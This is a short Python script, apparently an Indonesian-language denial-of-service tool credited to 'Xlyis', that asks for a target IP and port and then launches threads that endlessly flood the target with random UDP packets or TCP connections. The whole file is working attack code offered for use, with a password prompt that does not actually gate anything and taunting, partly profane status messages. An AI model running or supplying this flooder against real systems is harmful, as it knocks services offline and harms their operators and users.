#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("\033[93m")
Password = input("MAUSKAN PASSWORD: ")

if Password=="XLYIS": #ganti 123 jadi pw lu terserah
    print(f"""
Password yang anda masukan Benar !!
    """) #Ganti aja ini jadi sciprt lu
else :
    print("Password anda salah Silahkan coba ulangi lagi nanti")

print("End Of the Scirpt") #penanda doang

print("""\033[91m
                  TOOLS BY XLYIS """)

print("\033[92m")
print(" TOOLS BY : UFTTT")
print(" ###########################################")
print(" | OWNER   : Xlyis                           ")
print(" • IDEA   : Xlyis                    •")
print(" • DISCORD : Xylis¥#4049                 •")
print(" ###########################################")
                       
ip = str(input("  IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" LANJUT UNTUK SERANGAN? (y/n):"))
times = int(input(" BERAPA PAKET DIKIRIM:"))
threads = int(input(" ISI  PAKET:"))
def run():
	data = random._urandom(1025)
	i = random.choice(("[HAHAHAHA MT]","[XLYIS NIH BOS]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[92m PERMISI PAKET FROM XLYIS !!! ")
		except:
			print("[!] PAKETNYA ENAK GAK KONTOL !!!")

def run2():
	data = random._urandom(150)
	i = random.choice(("[HAHAHAHA MT]","[XLYIS NIH BOS]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PAKET FROM XLYIS !!! ")
		except:
			s.close()
			print("[*] PAKETNYA ENAK GAK OM !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()